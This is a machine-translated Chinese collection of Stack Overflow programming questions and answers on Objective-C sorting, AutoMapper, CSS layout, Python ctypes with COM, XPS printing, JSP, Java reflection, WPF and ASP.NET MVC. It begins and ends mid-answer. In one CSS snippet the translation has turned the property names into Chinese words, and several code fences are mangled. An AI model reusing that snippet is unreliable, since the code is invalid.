此信息不存储在文件中。它是文件系统存储的一部分。不同的文件系统会将二进制数据存储在不同的位置。有些文件系统会将信息存储在目录文件中。[您应该在 Wikipedia 上](http://en.wikipedia.org/wiki/Filesystem_permissions)阅读有关文件系统权限的更多信息

如果您想读取权限，因为它们通常是从目录列表中访问的，请查看[ls 命令](http://linux.die.net/man/1/ls)。

如果您*真的*想以“原始”形式查看“二进制”数据，请查看使用 C 等编程语言打开和读取目​​录文件。

# iphone - 对字典对象数组进行排序

> ID：13360709
> 
> 赞同：2
> 
> 时间：2012-11-13T12:24:10.673
> 
> 标签：iphone, ios, xcode, nsmutablearray

我遇到的问题是我无法对 NSMutableDictionary 对象的 NSMutableArray 进行排序，我想按评级对对象进行排序，评级是 NSNumber，我错过了什么？

我当前的代码总结了“arrayMealRating”中的所有评级并对结果数组进行排序：

```
 [arrayMealRating addObject:[NSMutableDictionary dictionaryWithObjectsAndKeys:
                                        [eachObject objectForKey:@"Airline"], @"Airline"
                                        ,[eachObject objectForKey:@"setMealRating"], @"setMealRating"
                                        , nil]];

        }
        NSArray *airlineNames = [arrayMealRating valueForKeyPath:@"@distinctUnionOfObjects.Airline"];

        // Loop through all the airlines
        for (NSString *airline in airlineNames) {

            // Get an array of all the dictionaries for the current airline
            NSPredicate *predicate = [NSPredicate predicateWithFormat:@"(Airline == %@)", airline];
            NSArray *airlineMealRating = [arrayMealRating filteredArrayUsingPredicate:predicate];

            // Get the sum of all the ratings using KVC @sum collection operator
            NSNumber *rating = [airlineMealRating valueForKeyPath:@"@sum.setMealRating"];

            //NSLog(@"%@: %@", airline, rating);
            [sortedMealArray addObject:[NSMutableDictionary dictionaryWithObjectsAndKeys:
                                        airline, @"Airline"
                                        ,[rating stringValue], @"setMealRating"
                                      , nil]];
        }

        NSSortDescriptor *descriptor = [[NSSortDescriptor alloc] initWithKey:@"setMealRating"  ascending:YES];
        [sortedMealArray sortedArrayUsingDescriptors:[NSMutableArray arrayWithObjects:descriptor,nil]];
        auxMealRating = [sortedMealArray copy]; 
```

有任何疑问，请不要投反对票，只要问，我会编辑问题。

最好的问候和对不起我糟糕的英语。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T12:30:25.823

这应该做你想要的：

```
NSArray *sortedArray = [arrayMealRating sortedArrayUsingComparator:^(id obj1, id obj2) {
    NSNumber *rating1 = [(NSDictionary *)obj1 objectForKey:@"setMealRating"];
    NSNumber *rating2 = [(NSDictionary *)obj2 objectForKey:@"setMealRating"];
    return [rating1 compare:rating2];
}]; 
```

# c# - 你能告诉 AutoMapper 在映射时全局忽略缺失的属性吗？

> ID：13360712
> 
> 赞同：18
> 
> 时间：2012-11-13T12:24:23.500
> 
> 标签：c#, automapper

我有很多实体，到目前为止，我一直在做类似的事情

```
Mapper.CreateMap<Employee, EmployeeDetailsDTO>()
    .ForSourceMember(mem => mem.NewsPosts, opt => opt.Ignore()); 
```

我想告诉 AutoMapper 只需忽略目标对象中缺少的属性，而不必指定每个属性。到目前为止，我还没有找到一种方法来处理我的多个 SO 和 Google 搜索。有人有解决方案吗？我已经准备好做某种循环或任何事情，只要它可以编写一次并且它将随着模型 / dto 更改或添加的属性而扩展。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-13T12:59:31.860

你什么时候收到错误？是你打电话的时候`AssertConfigurationIsValid`吗？

如果是，那么*就不要调用这个方法*

您不必调用此方法，请考虑以下有效的映射：

```
public class Foo1
{
    public string Field1 { get; set; }
}
public class Foo2
{
    public string Field1 { get; set; }
    public string Field2 { get; set; }
}

Mapper.CreateMap<Foo1, Foo2>();
var foo1 = new Foo1() {Field1 = "field1"};
var foo2 = new Foo2();
Mapper.Map(foo1, foo2);//maps correctly, no Exception 
```

您可能需要调用*其他*`AssertConfigurationIsValid`映射以确保它们正确，因此您需要做的是将映射组织到配置文件中：

 *```
public class MyMappedClassesProfile: Profile
{
    protected override void Configure()
    {
        CreateMap<Foo1, Foo2>();
        //nb, make sure you call this.CreateMap and NOT Mapper.CreateMap
        //I made this mistake when migrating 'static' mappings to a Profile.    
    }
}

Mapper.AddProfile<MyMappedClassesProfile>(); 
```

然后如果您决定要检查映射的有效性（根据您的情况逐案）然后调用

```
Mapper.AssertConfigurationIsValid(typeof(MyMappedClassesProfile).FullName); 
```

***在您的情况和/或您不*打电话的任何情况下**很重要**`AssertConfigurationIsValid`，您应该使用[AutoFixture](http://autofixture.codeplex.com/)和单元测试之类的东西来确保您的映射正常工作。（这是 的意图`AssertConfigurationIsValid`）**

 *** * *

## 回答 #2

> 赞同：7
> 
> 时间：2016-07-17T13:16:55.350

[wal 的回答](https://stackoverflow.com/questions/13360712/can-you-tell-automapper-to-globally-ignore-missing-properties-when-mapping/13361170#13361170)中建议“不要调用 AssertConfigurationIsValid()”是不安全的，因为它会隐藏映射中的潜在错误。
最好明确地忽略类之间的映射，因为您确信所有需要的属性都已经正确映射。您可以使用在[AutoMapper 中创建的扩展：“忽略其余部分”？](https://stackoverflow.com/questions/954480/automapper-ignore-the-rest/38073718#38073718)回答：

```
var config = new MapperConfiguration(cfg =>
{
    cfg.CreateMap<Src, Dest>();
     cfg.IgnoreUnmapped<Src, Dest>();  // Ignores unmapped properties on specific map
}); 
```

不带参数的重载会`cfg.IgnoreUnmapped(this IProfileExpression profile)` 忽略所有映射上的未映射属性，因此不推荐使用，因为它还隐藏了所有类的任何潜在问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-09-08T06:36:08.933

如果我有很多类需要忽略很多属性，我不想在调用 AssertConfigurationIsValid() 时出现异常，而是更愿意在日志中报告它并且只是查看所有有意遗漏的未映射属性。因为 AutoMapper 没有公开进行验证的方法，所以我捕获了 AssertConfigurationIsValid 并将错误消息作为字符串返回。

```
 public string ValidateUnmappedConfiguration(IMapper mapper)
    {
        try
        {
            mapper.ConfigurationProvider.AssertConfigurationIsValid();
        }
        catch (AutoMapperConfigurationException e)
        {
              return e.Message;
        }
        return "";
    } 
```

我从单元测试中调用 ValidateUnmappedConfiguration 方法

```
 [TestMethod]
    public void LogUmmappedConfiguration()
    {
        var mapper = new MapperConfiguration((cfg =>
        {
            cfg.AddProfile(new AutoMapperProfile());
        })).CreateMapper();
        var msg=ValidateUnmappedConfiguration(mapper) ;
        if (!msg.IsNullOrBlank())
        {
            TestContext.WriteString("Please review the list of unmapped fields and check that it is intentional: \n"+msg);
        }
    } 
```***

# html - 在居中的文本中右对齐第二行

> ID：13360713
> 
> 赞同：1
> 
> 时间：2012-11-13T12:24:26.510
> 
> 标签：html, css, responsive-design

抱歉，如果标题不是很清楚，但我正在尝试弄清楚如何使用 CSS 解决以下问题。

我有一个文本应该以两行显示：想象第一行是“hello world”，第二行是“goodbye”

我需要以这种方式在**屏幕中央**显示文本：

```
你好世界
    再见

```

我将其用作第一次尝试，但我得到的只是两条线都居中。我需要让第二行向右对齐。

```
div#logo {
    明确：两者；
    填充：1em；
    边框：0；
    保证金：1em自动；
    文本对齐：居中；
    宽度：75%；
}

```

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T12:52:18.140

最简单的解决方案：让您的段落与`max-width`设置为第一行的宽度右对齐，第二行将自动中断并向右对齐。

**html**

```
<div id="logo">
    <p>Hello World goodbye!</p>
</div>​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ 
```

**css**

```
#logo
{
    display:block;
    width:100px;
    position:relative;
    margin-left:auto;
    margin-right:auto;
}
#logo p
{
    max-width:80px;
    text-align:right;
} 
```

​ 这是一个功能性的[小提琴](http://jsfiddle.net/KHUJp/1/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T12:50:31.267

**HTML：**

 `````
<div id="logo"><p>First line<br />Remaining Text</p></div> 
````  `**CSS：**

 `````
div#logo {text-align:center;}
div#logo p {display:inline-block; text-align:right;} 
````  `* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-13T12:55:05.267

如果您知道徽标 div 中文本的宽度，这是一件相对简单的事情，如果您不知道，我相信您将需要 jQuery 来完成它。

```
<div id="logo">
    <p class="right">
    hello world<br />
    goodbye
    </p>
</div>

div#logo {
clear: both;
padding: 1em;
border: 0;
margin: 1em auto;
text-align: center;
width: 75%;
position:relative;
height:100px; 
}

.right{
position:absolute;
width:90px;
margin-left:-45px;
} 
```

演示：http: [//jsfiddle.net/calder12/QnGDs/1/](http://jsfiddle.net/calder12/QnGDs/1/)

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-11-13T12:40:26.003

仅在宽度已知或预设的情况下

```
<div class="wrapper">  
    <div class="first-line">hello word</div>  
    <div class="second-line">goodbye</div>  
</div>`

<style>  
    .wrapper{ width: 70px; margin: 0 auto;}  
    .first-line { float: left;}  
    .second-line{ float: right;}  
</style>` 
```

**解释**
.wrapper：

1.  宽度 - 必须知道和预先设置不一定在 css 中您可以使用内联样式
2.  边距 - 顶部和底部 0px，左右平衡

。第一行：

1.  浮动 - 向左

。第二行

1.  浮动 - 向右

请检查链接以查看工作示例 [http://jsfiddle.net/pQTBz/](http://jsfiddle.net/pQTBz/)

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-11-13T12:27:16.633

如果您将该文本放在 ap 元素中，例如：

```
<div id="logo">
<p>Hello world <br />goodbye</p>
</div> 
```

并应用以下CSS：

```
div#logo
{
width: 75%;
margin: 0px auto;
}

#logo p
{
text-align: right;
} 
```

我相信这就是你想要的。

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2012-11-13T12:30:30.490

将你的第二行放在其他容器中然后将其推向右侧怎么样

```
<div id="logo">
hello world<br/>
<span class="right">goodbye</span>
</div>

div#logo {
clear: both;
padding: 1em;
border: 0;
margin: 1em auto;
text-align: center;
width: 75%;
}

.right {
text-align: right;
float: right;
} 
```````

# python - 使用 COM 对象的 Python ctypes 和 DLL

> ID：13360718
> 
> 赞同：6
> 
> 时间：2012-11-13T12:24:52.780
> 
> 标签：python, dll, com, ctypes

在 Windows 下，我正在尝试使用`SomeLib.dll`Python 2.7 中用 C++ 编写的第 3 方 DLL ()，使用`ctypes`. 对于它的一些特性，这个库使用另一个 COM DLL ( `SomeCOMlib.dll`)，它本身使用另一个 DLL ( `LibA.dll`)。

*请注意，这不是直接从 Python 使用 COM DLL，而是使用从 Python 使用它的 DLL。*

为了使与 Python 的集成更容易，我将要使用的调用分组到我自己的函数中，在一个新的`MyLib.dll`DLL (情景）。本质上，我的库公开了 2 个函数：, （全部返回，无参数）。`ctypes``extern "C"``doSomethingSimple()``doSomethingWithCOMobj()``void`

“有效”的依赖层次结构如下：

```
MyLib.dll
  SomeLib.dll
    SomeCOMlib.dll
      LibA.dll 
```

我能够编写一个简单的 C++ 控制台应用程序 (Visual C++)，它`MyLib.dll`可以毫无问题地使用并进行这两个连续调用。

使用 Python/ctypes，第一个调用可以正常工作，但是使用 COM 的调用会抛出`WindowsError: [Error -529697949] Windows Error 0xE06D7363`. 从库的其余行为中，我可以看到问题正是在进行 COM 调用的地方。

（如果丢失，简单的测试 C++ 应用程序也会或多或少在同一个地方`LibA.dll`失败，但我不确定它是否相关。）

[我已经使用Dependency Walker](http://www.dependencywalker.com/)查看了依赖层次结构。 `SomeCOMlib.dll`没有列为 的依赖项`SomeLib.dll`，尽管它显然是必需的，`LibA.dll`也没有列为 的依赖项`SomeCOMlib.dll`，尽管它在运行时也明确需要。

我从命令行运行所有内容，从这些 DLL 所在的目录中运行（并且 C++ 示例可执行文件工作正常）。我试图强制 PATH 包含该目录，并且我还尝试将 DLL 复制到我猜想它们可能会被拾取的各个地方（`C:\Windows\System32`和`C:\Python27\DLLs`），但没有成功。 `SomeCOMlib.dll`也注册了`regasm.exe`。

**`ctypes`当涉及到它自己对 COM 机制的使用（以及可能随后在那里加载其他 DLL）时，在普通 C++ 应用程序和 Python 应用程序中使用这个 DLL 会导致这种差异？**

**哪些步骤至少比`Windows Error 0xE06D7363`Python 提供更多信息，以便能够进一步调查问题？**

Python 代码如下所示：

```
import ctypes
myDll = ctypes.WinDLL("MyLib.dll")
myDll.doSomethingSimple()
myDll.doSomethingWithCOMobj() # This statement throws the Windows Error 
```

（链接到的测试 C++ 独立应用程序在 . 中`MyLib.dll`进行完全相同的调用`main`。）

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-16T20:12:31.870

当您需要一个进程内 COM 对象时，您不需要直接链接到实现的 DLL。您通常使用[`CoCreateInstance`](http://msdn.microsoft.com/en-us/library/windows/desktop/ms686615(v=vs.85).aspx)/ [`CoCreateInstanceEx`](http://msdn.microsoft.com/en-us/library/windows/desktop/ms680701(v=vs.85).aspx)，它将为您加载 DLL。

查找通过[应用程序的清单](http://msdn.microsoft.com/en-us/library/windows/desktop/aa374191(v=vs.85).aspx)及其依赖[程序集清单](http://msdn.microsoft.com/en-us/library/windows/desktop/aa374219(v=vs.85).aspx)。这样做是为了支持[免注册 COM](http://msdn.microsoft.com/en-us/library/windows/desktop/aa375134(v=vs.85).aspx)。

如果没有应用程序清单，或者没有任何依赖程序集清单在`comClass`XML 元素中声明您的类，则查找默认为注册表，它将检查¹以查找名为的子项，该子项本身带有一个说明 DLL 的子项。[`HKEY_CLASSES_ROOT\CLSID`](http://msdn.microsoft.com/en-us/library/windows/desktop/ms691424(v=vs.85).aspx)^(`{<your-CLSID>}`[`InProcServer32`](http://msdn.microsoft.com/en-us/library/windows/desktop/ms682390(v=vs.85).aspx))

这解释了为什么 SomeCOMlib.dll 不显示为依赖项。它没有解释为什么 LibA.dll 不作为它的依赖项出现，可能是因为它是动态加载的。如果您在 Dependency Walker 中分析您的应用程序，您将在底部窗格中看到 LoadLibrary 调用的日志。要对其进行分析，请在 Dependency Walker 中打开您的 Python 可执行文件，然后转到菜单选项 Profile->Start profiling...，设置参数以运行您的`.py`文件，然后单击 Ok。

0xE06D7363 异常代码是[Visual C++ 异常代码](http://support.microsoft.com/kb/185294)。您应该检查`doSomethingWithCOMobj`. 要调试它，请使用您喜欢的工具（Visual C++、WinDbg 等），打开 Python 的可执行文件，设置运行`.py`文件的参数，并在运行应用程序之前在函数的第一条语句上启用断点。然后运行它并逐步执行每条指令。

很难猜测您的本机 C++ 应用程序和 Python 有什么不同，但可能是 Python 和 使用了不同的 COM 初始化参数`doSomethingWithCOMobj`，或者您没有声明它`__stdcall`（尽管是一个无关紧要的 void 函数） ，或者它尝试写入标准输出并且您使用`pythonw.exe`的不是控制台应用程序等。

* * *

^(1.) `HKEY_CLASSES_ROOT`是和的混合`HKEY_CURRENT_USER\Software\Classes`体`HKEY_LOCAL_MACHINE\Software\Classes`。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-14T17:30:40.133

您可以使用诸如 processexplorer 之类的东西来确定是否所有必需的库都已加载到正在运行的进程中。

1.  您是否在 Python 代码中的某处初始化了 COM 运行时？在您的 C++ 代码中？C++ 代码和 Python/ctypes 之间的一个区别是，在 C++ 代码中，dll 的 DllMain() 函数在加载 dll 时被调用，Python/ctypes 不会这样做，因为 dll 是完全动态加载的。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-03-14T01:47:23.900

我猜你有和[我一样的问题](https://stackoverflow.com/questions/49266538/ctypes-dll-call-works-in-ipython-but-not-in-regular-python)，虽然我真的不知道，因为与这种情况不同，我对我正在使用的 dll 一无所知。6年后我不知道你是否还能测试这个，但我想知道导入`pythoncom`是否能解决问题。

```
import ctypes
import pythoncom
myDll = ctypes.WinDLL("MyLib.dll")
myDll.doSomethingSimple()
myDll.doSomethingWithCOMobj() # This statement throws the Windows Error 
```

# c# - 打印到 XPS 文件，然后打印到打印机

> ID：13360720
> 
> 赞同：6
> 
> 时间：2012-11-13T12:24:59.773
> 
> 标签：c#, winforms, printing, richtextbox, xps

我尝试打印 RichTextBox 的内容，如果打印到打印机，错误太多。但是当我打印到 XPS 文件（通过 Windows 中的 XPS 打印机）然后将此文件打印到打印机时一切正常。

那么我可以以编程方式完成所有这些事情吗？

这是我的打印方法：

```
 public int PrintRotate(bool rotate, PrintPageEventArgs e, int charFrom, int charTo)
    {
        //Calculate the area to render and print
        RECT rectToPrint;
        rectToPrint.Top = (int)(e.MarginBounds.Top * anInch);
        rectToPrint.Bottom = (int)(e.MarginBounds.Bottom * anInch);
        rectToPrint.Left = (int)(e.MarginBounds.Left * anInch);
        rectToPrint.Right = (int)(e.MarginBounds.Right * anInch);

        //Calculate the size of the page
        RECT rectPage;
        rectPage.Top = (int)(e.PageBounds.Top * anInch);
        rectPage.Bottom = (int)(e.PageBounds.Bottom * anInch);
        rectPage.Left = (int)(e.PageBounds.Left * anInch);
        rectPage.Right = (int)(e.PageBounds.Right * anInch);

        IntPtr hdc = e.Graphics.GetHdc();

        FORMATRANGE fmtRange;
        fmtRange.chrg.cpMax = charTo;               //Indicate character from to character to 
        fmtRange.chrg.cpMin = charFrom;
        fmtRange.hdc = hdc;                    //Use the same DC for measuring and rendering
        fmtRange.hdcTarget = hdc;              //Point at printer hDC
        fmtRange.rc = rectToPrint;             //Indicate the area on page to print
        fmtRange.rcPage = rectPage;            //Indicate size of page

        SetGraphicsMode(fmtRange.hdc, GM_ADVANCED);

        XFORM par = new XFORM();

        par = new XFORM();
        par.eM11 = 1;
        par.eM12 = 0;
        par.eM21 = 0;
        par.eM22 = 1;
        par.eDx = -e.PageSettings.Margins.Left / 100 * e.PageSettings.PrinterResolution.X;
        par.eDy = -e.PageSettings.Margins.Top / 100 * e.PageSettings.PrinterResolution.Y;
        ModifyWorldTransform(fmtRange.hdc, ref par, MWT_LEFTMULTIPLY);

        IntPtr res = IntPtr.Zero;

        IntPtr wparam = IntPtr.Zero;
        wparam = new IntPtr(1);

        //Get the pointer to the FORMATRANGE structure in memory
        IntPtr lparam = IntPtr.Zero;
        lparam = Marshal.AllocCoTaskMem(Marshal.SizeOf(fmtRange));
        Marshal.StructureToPtr(fmtRange, lparam, false);

        //Send the rendered data for printing 
        res = SendMessage(Handle, EM_FORMATRANGE, wparam, lparam);

        //Free the block of memory allocated
        Marshal.FreeCoTaskMem(lparam);

        //Release the device context handle obtained by a previous call
        e.Graphics.ReleaseHdc(hdc);

        //Return last + 1 character printer
        return res.ToInt32();
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-02-26T11:54:53.183

I've had a problem like this, and ended up making an .XPS file and then sending that to the printer.

From your question, it sounds like you already have the process of "printing" to the xps file down, which is good since I don't know anything about the process of printing the rich text box to the xps file. In my scenaria I needed to print a dokument without using ms office, so I ended up making a XPS file, edit it in code, and then send it to the printer.

This is the code I use to send the xps-file directly to the printer:

```
LocalPrintServer localPrintServer = new LocalPrintServer();
var queue = localPrintServer.GetPrintQueue("NameOfPrinter");
PrintSystemJobInfo xpsPrintJob = queue.AddJob("name of print job", "my/xps/path.xps",false); 
```

Also remember that for this code to work you need to add references to System.Printing AND "ReachFramework". Took me longer than I care to remember to find out why I couldn't access the printjob.

Most printers should support this in my experience. The common ones and it even works on the odd "barcode-printer" at our storage-department.

# jsp - 将字符串发送到href内的另一个jsp文件

> ID：13360724
> 
> 赞同：1
> 
> 时间：2012-11-13T12:25:14.843
> 
> 标签：jsp, jstl

我需要使用href将字符串从jsp文件发送到另一个jsp文件。这是我的代码

```
 <td>${fn:escapeXml(drugtarget.properties.drug)}</td>
  <td><a href="/list.jsp">Show Info</a></td> 
```

我想将此“${fn:escapeXml(drugtarget.properties.drug)}”发送到 list.jsp 文件。谢谢

好的，我是这样发送的

```
 <c:forEach items="${drugtargets}" var="drugtarget">
<tr>
  <td>${fn:escapeXml(drugtarget.properties.drug)}</td>
  <td><a href="/list.jsp?value=${fn:escapeXml(drugtarget.properties.drug)}">Show Info</a></td>
</tr> 
```

现在在 list.jsp 文件中，我想显示该值。顺便在 list.jsp 中使用 JSTL

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T13:20:18.043

要获取 list.jsp 中的值，请尝试使用

```
${param.value} 
```

# java - 带有参数的私有静态方法的Java反射

> ID：13360725
> 
> 赞同：5
> 
> 时间：2012-11-13T12:25:16.543
> 
> 标签：java, android, reflection

我`invoke`在java中使用该方法时遇到问题。

我有一种方法可以用来为我提供一个`Method`对象，它看起来像：

```
 public static Method provideMethod(String methodName, Class targetClass) throws NoSuchMethodException {
    Method method = targetClass.getDeclaredMethod(methodName,null);

    //Set accessible provide a way to access private methods too
    method.setAccessible(true);

    return method;
} 
```

好的，当我尝试从任何没有参数的上下文（静态或非静态）访问方法时，此方法非常有效。

现在的问题是我不能调用调用并将参数传递给具有参数的方法，例如：

我有以下方法：

```
private static boolean createDirectory(String path, String fileName) {
  ... 
} 
```

我想像这样调用它：

```
 Boolean created = (Boolean) DataUtils.provideMethod("createDirectory", FileUtils.class).
            invoke(null, String.class, String.class); 
```

但我得到了`java.lang.NoSuchMethodException: createDirectory []`。

**有人知道我如何调用具有参数的私有静态方法吗？**

**而且，如何将值传递给该方法的参数？**

谢谢，阿克德

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-13T12:28:00.167

您正在显式调用反射方法，该方法查找使用给定参数类型声明的方法 - 但您没有提供任何参数类型。

如果您想查找具有给定名称的*任何*方法，请使用`getDeclaredMethods()`并按名称过滤...但是当您调用时`invoke`，您需要提供字符串*值*，而不是参数类型。

或者，将您的`provideMethod`调用更改为*也*接受参数类型，以便您可以使用：

```
DataUtils.provideMethod("createDirectory", FileUtils.class,
                        String.class, String.class)
         .invoke(null, "foo", "bar") 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-13T12:28:49.240

当您调用时，您只是专门查找没有参数的方法

```
Method method = targetClass.getDeclaredMethod(methodName,null) 
```

为了找到 createDirectory 方法，您需要调用

```
targetClass.getDeclaredMethod("createDirectory", String.class, String.class) 
```

但目前你的`provideMethod`方法没有办法做到这一点。

我建议您更改的签名，`provideMethod`以便它允许调用者传入他们正在寻找的参数的类，如下所示：

```
public static Method provideMethod(String methodName, Class targetClass, Class... parameterTypes) throws NoSuchMethodException {
    Method method = targetClass.getDeclaredMethod(methodName, parameterTypes);

    //Set accessible provide a way to access private methods too
    method.setAccessible(true);

    return method;
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-13T12:29:26.527

改变这个

```
Method method = targetClass.getDeclaredMethod(methodName, null); 
```

类似的事情

```
Method method = targetClass.getDeclaredMethod(methodName, Class<?>... parameterTypes); 
```

和你的`provideMethod`相应。

# c# - 在子控件上注册和事件处理程序并在父控件上捕获事件

> ID：13360727
> 
> 赞同：0
> 
> 时间：2012-11-13T12:25:22.200
> 
> 标签：c#, wpf, mvvm

我为此提供了一些解决方案（由 Stack Exchange Guru 提供），但我很好奇如何正确实现这一点，因为我读到一个选项是在子控件中创建一个事件并在父控件中订阅/收听它.

我有一个子控件，其中 onPropertyChanged 成功触发：

```
public class KeypadEventArgs : EventArgs
    {
        public KeypadEventArgs(double result)
        {
            Result = result;
        }

        public double Result { get; set; }
    }

protected void OnPropertyChanged(string name)
    {
        switch (name)
        {
            case "Result":                    
                    KeyUpdated(this, new KeypadEventArgs(Result));
                break;
        }
    } 
```

它被添加到 XAML 中的主机控件中，如下所示：

```
<UserControl:KeypadView Width="200" Height="300" Visibility="Collapsed" /> 
```

现在我希望主机/父控件订阅子控件的 KeyUpdated 事件：

就像是：

```
this.keypadViewModel.KeyUpdated += this.OnKeyUpdated;
...
private void OnKeyUpdated(object sender, KeypadViewModel.KeypadEventArgs e)
    {
        value = e.Result;
    } 
```

我了解（排序）MVVM 模式并不真正希望 ViewModel 访问视图。因此，如果父级从不“创建”子级控件，它是如何意识到的呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T12:33:25.883

我可能会稍微误解这里的模式，但我认为父母应该有自己的 ViewModel 来监听子 ViewModel。当孩子改变它的 ViewModel 通知父母的 ViewModel 和父母的视图相应地更新。

但就像我说的那样，我可能会误解。

**编辑：**

基本上它应该像这样工作：

子视图 -> 子视图模型 -> 父视图模型 -> 父视图

所以让子视图改变子视图模型。确保父视图模型正在侦听通知其更改的事件，并让父视图从那里侦听父视图模型。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T14:00:54.467

哦，我悲伤的麻袋。您可以命令绑定链。

它没有 100% 回答我的问题，但教会了我。

```
Command={Binding Parent.DataContext.SomeCommand, RelativeSource={RelativeSource FindAncestor, AncestorType={x:Type UserControl}}} 
```

# asp.net - 当我们在 iPhone 上时，常规视图不起作用？

> ID：13360730
> 
> 赞同：0
> 
> 时间：2012-11-13T12:25:27.350
> 
> 标签：asp.net, asp.net-mvc, asp.net-mvc-3

我将 MVC 4 与此自定义 displaymodeprovider 一起使用。即使我将其设置为“false”，它仍然在 iPhone 上返回移动版本，但我想返回网站的常规版本。请帮忙

```
DisplayModeProvider.Instance.Modes.Insert(0, new
        DefaultDisplayMode("Mobile")
        {
            ContextCondition = (context => false)
        }); 
```

我在这段代码中设置了断点并调用它，尽管它仍然返回移动版本。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T13:07:20.510

最终我发现了问题

MVC 4 已经有了自己的“Mobile”前缀重定向。因此，要使用自定义逻辑，我们需要删除“Mobile”前缀的 DisplayModeProvider，如下所示：

```
 var mobileModel = DisplayModeProvider.Instance.Modes.FirstOrDefault(a => a.DisplayModeId == "Mobile");
        if (mobileModel != null)
        {
            DisplayModeProvider.Instance.Modes.Remove(mobileModel);
        }

        DisplayModeProvider.Instance.Modes.Insert(0, new
        DefaultDisplayMode("Mobile")
        {
            ContextCondition = (context => <USE ANY YOUR CUSTOM LOGIC>)
        }); 
```

对于希望他们的网站在 iPad、iPhone 或 Android 的两个版本中可用的人来说，这个答案将非常有用，例如，我们可以在 coockie 用户中存储我们应该在他的设备中显示哪个版本的网站。

# iphone - 如何清除 UITableview 的 CustomCell 的 UITextField 中的文本？

> ID：13360734
> 
> 赞同：1
> 
> 时间：2012-11-13T12:25:37.410
> 
> 标签：iphone, xcode, uitableview, uitextfield, subclass

我在 UITableview 的 CustomCell 中有一个 UITextField，我使用这个 UITableview 作为 Mainview 的子视图。还有另一个 UITableview 也在我的 MainView 上，但我使用这个 UITableview 作为我的 MainView 的子类。下面的图像也将是 hlepfull 理解我的问题。

![在此处输入图像描述](../Images/148d1b9c5335410fcd6f90367c8145fa.png)

如图所示，UITableview 上面是我的子类 UITableviw，下面是单行 UITableview，CustomCell 具有 UITextField。现在我希望当我单击子类 UITableview 的任何单元格时，我的 UITextField 文本是清晰的，我在 UITableview 的 CustomCell 中拥有。

**注意：-**为了让我的问题更简单，当我在 MainView 上（不在 UITableview 的 CustomCell 中）有 UITextfield 时，我有一些代码对我有用。这是我的代码。在 Mainview.h 文件中

```
#import <UIKit/UIKit.h>
#import "Inputtableview.h"
@interface testingViewController : UIViewController<UITextFieldDelegate,UITableViewDelegate,UITableViewDataSource> {
IBOutlet UITextField *txtfinput;
Inputtableview *inputview;
IBOutlet UITableView *inputtbl; 
}
@property (nonatomic, retain) UITextField *txtfinput;
@end 
```

然后在 Mainview.m 文件的 ViewDidload

```
- (void)viewDidLoad {
if (inputview == nil) {
    inputview = [[Inputtableview alloc] init];
}
[inputtbl setDataSource:inputview];
[inputtbl setDelegate:inputview];
    inputview.view = inputview.tableView;
    inputview.myAccessToMaintxtf = txtfinput;
[super viewDidLoad];
} 
```

现在在我的 UITableview.h 文件的子类中

```
#import <UIKit/UIKit.h>
@interface Inputtableview : UITableViewController<UITableViewDelegate,UITableViewDataSource> {
}
@property (nonatomic, assign) UITextField *myAccessToMaintxtf;
@end 
```

最后在我的子类 UITableview.m 文件中

```
@implementation Inputtableview
@synthesize myAccessToMaintxtf; 

#pragma mark -
#pragma mark Table view delegate

- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath {

UITableViewCell *selectedCell = [tableView cellForRowAtIndexPath:indexPath];
 myAccessToMaintxtf.text=@"";
 } 
```

正如我之前提到的，当我的 MainView 中有 TextField 时，上面的代码可以正常工作，但是当我想清除 UITableview 的 CustomCell 中的 UITextField 的文本时，我不知道如何修复它。任何帮助都将得到应用。提前感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T12:35:29.943

您是否将 myAccessToMaintxtf 添加为 dataSource cellForRowAtIndexPath 中 UITableViewCell 的子视图？如果你这样做了，你仍然需要使用 [tableView reloadCellAtIndexPath:...] 重新加载单元格；

或者另一个建议是将 UITableViewCell 子类化，并添加一个 Outlet 属性，将插座连接到 TextField。然后你可以做类似 selectedCell.textField.text = @""; 在你 didSelectRowAtIndexPath 中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T12:43:49.677

好的，我看不到您如何将“myAccessToMaintxtf”连接到 CustomCell 中的文本字段。我用来从我的自定义单元格中获取子视图的是“标签”。标签可以用作子视图的标识符。因此，如果您使用的是 xib，则可以在文本字段的设置选项卡中设置标签，如果您通过代码创建文本字段，则可以将标签设置为：

```
 myAccessToMaintxtf.tag = 11; //11 is and example number, use the number that you want 
```

然后，当您想访问您的文本字段时，请使用：

```
theTextFieldToClear = (UITextField*)[theCellWithTheTextFieldToClear viewWithTag:11]; 
```

您可以在 UIView 类参考中找到有关标签的更多信息：http: [//developer.apple.com/library/ios/#documentation/uikit/reference/uiview_class/uiview/uiview.html](http://developer.apple.com/library/ios/#documentation/uikit/reference/uiview_class/uiview/uiview.html)

祝你好运

编辑2：

如果您使用两个表格，并且您想清除一个表格中的文本字段，选择另一个表格，我认为您需要一些东西来在一个表格中选择的 indexPath 和带有文本字段的单元格的 indexPath 之间建立链接。如果您正在使用类似的东西：

